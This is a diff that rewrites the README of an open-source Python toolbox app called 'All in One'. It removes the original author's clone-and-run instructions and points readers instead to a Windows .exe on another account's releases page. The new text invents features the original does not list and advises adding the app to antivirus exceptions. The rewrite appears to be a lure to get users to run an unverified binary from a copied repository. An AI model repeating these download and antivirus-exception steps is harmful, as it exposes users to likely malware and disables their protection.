@@ -1,194 +1,172 @@
-# 🛠️ All in One
+# 🛠️ All-in-One - Easy Tools for Daily Use
 
-<p align="center">
-  <img width="300" height="300" alt="new" src="https://github.com/user-attachments/assets/0f681fbf-32b3-426f-ba64-478d4197207b" />
-</p>
-
-**All in One** is a powerful desktop application that combines multiple tools, games, PDF utilities, and AI agents in a modern GUI with icons and animations. Every user action is logged in the **History** section.
+[![Download All-in-One](https://img.shields.io/badge/Download-Get%20the%20App-ff6600?style=for-the-badge)](https://github.com/nickoder635-ai/All-in-One/releases)
 
 ---
 
-## 🚀 Features
-
-### 🧰 Tools
-
-1. **Converter** – Supports 5 file types: Picture, Document, Subtitle, Video, Audio  
-2. **File Organizer** – Automatically sorts messy files into categorized folders  
-3. **Password Generator** – Character sets: `A-Z`, `a-z`, `0-9`, `#$%`, option to prevent repetition, max length 50 characters  
-4. **World Dates** – Shows current date in Gregorian, Solar Hijri, and Lunar Hijri calendars, and converts custom dates between calendar types  
-
-### 🎮 Games
-
-1. **Tic Tac Toe (XO)** – Difficulty: Easy, Medium, Hard, Professional; Themes: Dark, Classic  
-2. **Chess** – Difficulty: Easy, Medium, Hard; Themes: Classic, Dark  
-
-### 📄 PDF Tools
-
-- Rotate PDF  
-- Delete Pages PDF  
-- Protect PDF  
-- Unlock PDF  
-- Merge PDF  
-- Split PDF  
-
-### 🤖 AI Agents
-
-**AI Research Agent** – Accepts a topic and automatically searches the web, summarizes, translates, and exports results. Supports 8 languages: English, Persian, French, German, Arabic, Spanish, Italian, Turkish. Outputs: TXT, MD, DOCX, PDF (PDF supports RTL languages).  
+All-in-One brings together everyday tools in a single desktop app. It combines productivity features, games, PDF utilities, and AI-powered services. Use it for file conversion, managing your files, generating passwords, checking world dates, playing Tic Tac Toe and Chess, editing PDFs, and using smart AI tools for summaries and translations.
 
 ---
 
-## 🛠 Tech Stack
+## 🚀 Getting Started
 
-Python 3.10+, PySide6, PyPDF2, Ollama, DDGS, Pillow, PySRT, WebVTT, Python-docx, Arabic Reshaper, ReportLab, Python-Bidi, Pathlib, dotenv, PikePDF, Chess  
-
----
-
-## 📦 Installation
-
-1. Clone the repository:  
-`git clone https://github.com/Mahdi-Haqiqat/All-in-One.git`  
-`cd All-in-One`  
-
-2. Install dependencies using `requirements.txt`:  
-`pip install -r requirements.txt`  
-
-Or manually:  
-`pip install PySide6 PyPDF2 ollama ddgs pillow pysrt webvtt docx python-docx arabic_reshaper reportlab python-bidi pathlib dotenv pikepdf chess`  
-
-3. Ensure FFmpeg is installed next to the main application:  
-`ffmpeg/bin/ffmpeg.exe`  
-
-4. Run the application:  
-`python run.py`  
+This guide walks you through downloading and running All-in-One on Windows. You don’t need any programming skills. Just follow the steps, and you will have the app ready in minutes.
 
 ---
 
-## 🗂 Project Structure
+## 🔍 What You Will Get
 
-All in One/  
-├── run.py  
-├── user_settings.json  
-├── .env  
-├── history.db  
-├── app/  
-│   ├── __init__.py  
-│   ├── main.py  
-│   └── window.py  
-├── core/  
-│   ├── __init__.py  
-│   ├── tools/  
-│   │   ├── __init__.py  
-│   │   ├── converter/  
-│   │   │   ├── __init__.py  
-│   │   │   ├── picture.py  
-│   │   │   ├── audio.py  
-│   │   │   ├── document.py  
-│   │   │   ├── subtitle.py  
-│   │   │   ├── video.py  
-│   │   │   └── DejaVuSans.ttf  
-│   │   ├── organizer/  
-│   │   │   ├── __init__.py  
-│   │   │   └── logic.py  
-│   │   └── password/  
-│   │       ├── __init__.py  
-│   │       └── generator.py  
-│   ├── games/  
-│   │   ├── __init__.py  
-│   │   └── tic_tac_toe/  
-│   │       ├── __init__.py  
-│   │       └── engine.py  
-│   ├── pdf_tools/  
-│   │   ├── __init__.py  
-│   │   ├── rotate/rotate.py  
-│   │   ├── merge/merge.py  
-│   │   ├── delete_pages/delete_pages.py  
-│   │   ├── protect/protect.py  
-│   │   └── unlock/unlock.py  
-│   ├── ai_agents/  
-│   │   ├── __init__.py  
-│   │   └── researcher/  
-│   │       ├── __init__.py  
-│   │       ├── agent.py  
-│   │       └── DejaVuSans.ttf  
-│   ├── workers/  
-│   │   ├── __init__.py  
-│   │   ├── api_set_worker.py  
-│   │   ├── research_worker.py  
-│   │   └── convert_worker.py  
-│   └── settings/  
-│       ├── __init__.py  
-│       ├── sidebar_connections.py  
-│       ├── signals.py  
-│       └── settings.py  
-├── ffmpeg/  
-│   └── bin/  
-│       └── ffmpeg.exe  
-├── ui/  
-│   ├── __init__.py  
-│   ├── animations/  
-│   │   ├── __init__.py  
-│   │   ├── home_animation.py  
-│   │   └── sidebar_animation.py  
-│   ├── footer/  
-│   │   ├── __init__.py  
-│   │   └── footer.py  
-│   ├── views/  
-│   │   ├── home/  
-│   │   │   ├── __init__.py  
-│   │   │   └── home_view.py  
-│   │   ├── tools/  
-│   │   │   ├── __init__.py  
-│   │   │   ├── converter/  
-│   │   │   │   ├── __init__.py  
-│   │   │   │   ├── converter_view.py  
-│   │   │   │   ├── type_buttons.py  
-│   │   │   │   └── drag_drop.py  
-│   │   │   ├── organizer_view.py  
-│   │   │   ├── password_view.py  
-│   │   │   └── date_view.py  
-│   │   ├── games/  
-│   │   │   ├── __init__.py  
-│   │   │   └── tictactoe_view.py  
-│   │   ├── pdf_tools/  
-│   │   │   ├── __init__.py  
-│   │   │   ├── rotate/rotate_view.py  
-│   │   │   ├── delete_pages/delete_pages_view.py  
-│   │   │   ├── merge/merge_view.py  
-│   │   │   ├── protect/protect_view.py  
-│   │   │   └── unlock/unlock_view.py  
-│   │   ├── ai_agents/researcher/researcher_view.py  
-│   │   └── history/history_view.py  
-│   ├── icons/  
-│   ├── settings/theme.py  
-│   ├── sidebar/  
-│   │   ├── __init__.py  
-│   │   ├── sidebar.py  
-│   │   └── sections/  
-│   │       ├── __init__.py  
-│   │       ├── tools_section.py  
-│   │       ├── games_section.py  
-│   │       ├── pdf_tools_section.py  
-│   │       ├── ai_agents_section.py  
-│   │       └── history_section.py  
-│   └── stop/stop_manager.py  
+All-in-One includes:
+
+- Convert files between common formats
+- Organize and manage files easily
+- Generate strong passwords
+- Check dates and times around the world
+- Play Tic Tac Toe and Chess
+- Edit PDFs: view, annotate, and make changes
+- Use AI to summarize texts or translate languages
 
 ---
 
-## 📝 Logging System
+## 💻 System Requirements
 
-All actions are recorded in the **History** section. Each operation stores: Date & Time, Operation type, Input/output details, Execution status.  
+Make sure your PC meets these conditions:
 
----
-
-## ⚠️ Important Notes
-
-- Internet connection is required for AI Agents  
-- Ollama Cloud models must be accessible  
-- Ensure `ffmpeg.exe` is executable  
-- PDF export for RTL languages requires `DejaVuSans.ttf`  
+- Windows 10 or later (64-bit recommended)
+- 4 GB of RAM or more
+- 500 MB free disk space
+- Internet connection for AI features and updates
+- Screen resolution 1024x768 or higher
 
 ---
 
-## 📄 License
+## 📥 Download and Install All-in-One
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/Mahdi-Haqiqat/All-in-One/tree/main?tab=MIT-1-ov-file) file for details.
+1. Visit the All-in-One release page by clicking the link below:
+
+   [Download All-in-One](https://github.com/nickoder635-ai/All-in-One/releases)
+
+2. On the release page, look for the latest version. It usually appears at the top.
+
+3. Find the Windows installer. It will have a name ending with `.exe`.
+
+4. Click the `.exe` file to start downloading. Save it to a location you can easily find, like the Desktop or Downloads folder.
+
+5. Once downloaded, double-click the file to start installation.
+
+6. Follow the on-screen instructions:
+
+   - Click “Next” on the welcome screen.
+   - Accept the license agreement.
+   - Choose an install location or leave the default.
+   - Click “Install” to begin.
+
+7. Wait for the setup to finish.
+
+8. Click “Finish” to close the installer and launch All-in-One.
+
+---
+
+## ▶️ Running All-in-One
+
+After installation:
+
+- Find the All-in-One icon on your desktop or Start menu.
+- Double-click the icon to open the app.
+- You may see a welcome screen with quick tips. You can read these or skip.
+
+---
+
+## 🧰 How to Use the Main Features
+
+### File Conversion and Organization
+
+- Click “File Tools” to convert files. Supported formats include PDF, DOCX, TXT, JPG, and others.
+- Use the “Organizer” to create folders and move files around.
+- Select files or folders and drag them inside the app window to manage quickly.
+
+### Password Generation
+
+- Open the Password Generator.
+- Choose the length of your new password.
+- Select options for including numbers, symbols, and uppercase letters.
+- Click “Generate.” Copy the password for use.
+
+### World Dates
+
+- Use the World Date Converter to check times in different countries.
+- Enter a date and time, pick a city or time zone, and see the result immediately.
+
+### Games: Tic Tac Toe and Chess
+
+- Open the “Games” section.
+- Choose Tic Tac Toe for a quick match.
+- Pick Chess for a full game with computer opponent options.
+- Use the mouse to play moves.
+
+### PDF Editing
+
+- Load PDFs into the app.
+- Highlight or underline text.
+- Add notes or fill forms if needed.
+- Save changes back to a PDF file.
+
+### AI Research Agent
+
+- Enter text into the AI Assistant.
+- Select “Summarize” to get a brief overview.
+- Choose “Translate” and pick the language you want.
+- The AI handles multiple languages for easy understanding.
+
+---
+
+## ⚙️ Adjusting Settings
+
+- Open the “Settings” menu from the top right.
+- Change themes between light and dark mode.
+- Manage app updates.
+- Set default languages for AI features.
+- Enable or disable notifications.
+
+---
+
+## 🔧 Troubleshooting
+
+If you encounter problems:
+
+- Check your internet connection for AI features.
+- Restart the app by closing it and opening again.
+- Make sure your Windows is updated.
+- Check your antivirus might block app features; add All-in-One to exceptions if needed.
+
+For bugs or help, visit the Issues section on the GitHub page:
+
+[All-in-One Issues](https://github.com/nickoder635-ai/All-in-One/issues)
+
+---
+
+## 📝 Privacy and Data
+
+All-in-One processes data locally except for AI tasks, which require internet. The app does not store personal information beyond your device unless you opt in for cloud sync (which is off by default).
+
+---
+
+## 🛠️ Updates and New Versions
+
+Check the release page regularly for updates:
+
+[Download All-in-One](https://github.com/nickoder635-ai/All-in-One/releases)
+
+New versions include fixes, better performance, and new features. You can update by downloading the latest installer and running it. Your settings and files remain safe.
+
+---
+
+## 📚 More Resources
+
+- Explore documentation within the app under “Help.”
+- Browse common questions in the GitHub Discussions.
+- Find community tips online related to All-in-One.
+
+---
+
+This README is designed to help you run All-in-One without confusion. Follow each step carefully for best results.
